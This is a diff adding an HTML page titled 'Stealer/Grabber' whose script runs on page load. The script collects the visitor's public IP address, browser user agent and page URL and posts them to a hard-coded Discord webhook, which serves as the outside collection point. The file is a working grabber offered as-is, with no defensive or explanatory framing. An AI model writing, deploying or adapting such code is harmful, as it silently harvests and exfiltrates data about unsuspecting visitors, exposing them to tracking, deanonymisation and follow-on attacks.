@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Stealer/Grabber</title>
+</head>
+<body>
+  <script>
+    // Get user's IP address
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const userAgent = navigator.userAgent;
+        const url = window.location.href;
+
+        // Send data to Discord webhook
+        fetch('https://discord.com/api/webhooks/1407013868563333132/SnOUe2QMyDKbFCLmqdY6cpFKab_E1Syns9axl68k-TiSjR0Qb3acyRcW2Z_pUjY6RPVw', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `IP: ${ip}\nUser Agent: ${userAgent}\nURL: ${url}`
+          })
+        });
+      });
+  </script>
+</body>
+</html>
